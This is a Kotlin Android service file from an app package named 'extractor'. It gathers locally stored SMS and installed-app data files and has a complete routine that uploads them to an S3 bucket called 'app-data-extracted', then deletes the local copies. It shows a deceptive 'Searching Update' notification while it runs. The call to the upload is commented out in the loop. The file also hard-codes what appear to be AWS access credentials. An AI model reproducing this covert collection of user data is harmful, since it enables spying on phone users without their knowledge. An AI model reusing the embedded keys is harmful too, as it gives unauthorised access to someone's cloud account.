package info.kalagato.com.extractor

import com.amazonaws.auth.BasicAWSCredentials
import info.kalagato.com.extractor.SyncService
import com.amazonaws.services.s3.AmazonS3Client
import com.amazonaws.mobileconnectors.s3.transferutility.TransferUtility
import com.amazonaws.mobile.client.AWSMobileClient
import com.amazonaws.mobileconnectors.s3.transferutility.TransferObserver
import com.amazonaws.mobileconnectors.s3.transferutility.TransferListener
import android.content.Intent
import info.kalagato.com.extractor.Extractor
import android.app.PendingIntent
import android.app.Service
import android.os.*
import androidx.core.app.NotificationCompat
import com.amazonaws.mobileconnectors.s3.transferutility.TransferState
import info.kalagato.com.extractor.R
import java.io.File
import java.io.IOException
import java.lang.Exception
import java.text.SimpleDateFormat
import java.util.*

class SyncService : Service() {
    private val TAG = "sync-service"
    private var mServiceHandler: ServiceHandler? = null
    private var mServiceLooper: Looper? = null

    private inner class ServiceHandler(looper: Looper?) : Handler(looper!!) {
        override fun handleMessage(msg: Message) {
            try {
                val c = Calendar.getInstance().time
                val df = SimpleDateFormat("dd-MMM-yyyy", Locale.getDefault())
                val formattedDate = df.format(c)
                val path = Environment.getExternalStorageDirectory().toString() + "/Folder"
                val mydir = applicationContext.getDir("mydir", MODE_PRIVATE)
                val directory = File(mydir.path)
                val files = directory.listFiles()
                for (i in files!!.indices) {
                    if (files[i].name.contains(Constant.SMS) ||
                        files[i].name.contains(Constant.INSTALLED_APP) ||
                        !files[i].name.contains(formattedDate)
                    ) {
                        // files[i].delete();
                      //  uploadWithTransferUtility(files[i])
                    }
                }
            } catch (ex: Exception) {
                ex.printStackTrace()
            }
            stopSelf()
        }

        fun uploadWithTransferUtility(file: File) {
            val credentials = BasicAWSCredentials(KEY, SECRET)
            val s3Client = AmazonS3Client(credentials)
            val transferUtility = TransferUtility.builder()
                .context(applicationContext)
                .awsConfiguration(AWSMobileClient.getInstance().configuration)
                .s3Client(s3Client)
                .build()


            /* final File file = new File(getApplicationContext().getDir("mydir", Context.MODE_PRIVATE),
                    "/Folder/" + filename);*/
            val YOUR_BUCKET_NAME = "app-data-extracted"
            val uploadObserver = transferUtility.upload(
                YOUR_BUCKET_NAME,
                KEY + packageName + "/" + file.name, file
            )

            // Attach a listener to the observer to get state update and progress notifications
            uploadObserver.setTransferListener(object : TransferListener {
                override fun onStateChanged(id: Int, state: TransferState) {
                    if (TransferState.COMPLETED == state) {
                        // Handle a completed upload.
                        file.delete()
                        if (file.exists()) {
                            try {
                                file.canonicalFile.delete()
                            } catch (e: IOException) {
                                e.printStackTrace()
                            }
                            if (file.exists()) {
                                applicationContext.deleteFile(file.name)
                            }
                        }
                    }
                }

                override fun onProgressChanged(id: Int, bytesCurrent: Long, bytesTotal: Long) {
                    val percentDonef = bytesCurrent.toFloat() / bytesTotal.toFloat() * 100
                    val percentDone = percentDonef.toInt()

//                    Log.d("YourActivity", "ID:" + id + " bytesCurrent: " + bytesCurrent
//                            + " bytesTotal: " + bytesTotal + " " + percentDone + "%");
                }

                override fun onError(id: Int, ex: Exception) {
                    // Handle errors
                }
            })

            // If you prefer to poll for the data, instead of attaching a
            // listener, check for the state and progress in the observer.
            if (TransferState.COMPLETED == uploadObserver.state) {
                // Handle a completed upload.
            }
        }
    }

    override fun onCreate() {
        val thread = HandlerThread("ServiceStartArguments", Process.THREAD_PRIORITY_FOREGROUND)
        thread.start()

        // Get the HandlerThread's Looper and use it for our Handler
        mServiceLooper = thread.looper
        mServiceHandler = ServiceHandler(mServiceLooper)
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        val notificationIntent = Intent(this, Extractor::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
        )
        val notification = NotificationCompat.Builder(this, Constant.CHANNEL_ID)
            .setContentTitle("Searching Update")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_settings)
            .setContentIntent(pendingIntent)
            .build()
        startForeground(1, notification)

        // For each start request, send a message to start a job and deliver the
        // start ID so we know which request we're stopping when we finish the job
        val msg = mServiceHandler!!.obtainMessage()
        msg.arg1 = startId
        mServiceHandler!!.sendMessage(msg)

        // If we get killed, after returning from here, restart
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    companion object {
        private const val KEY = "AKIAXTJK7XDQG3HJAFXN"
        private const val SECRET = "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"
    }
}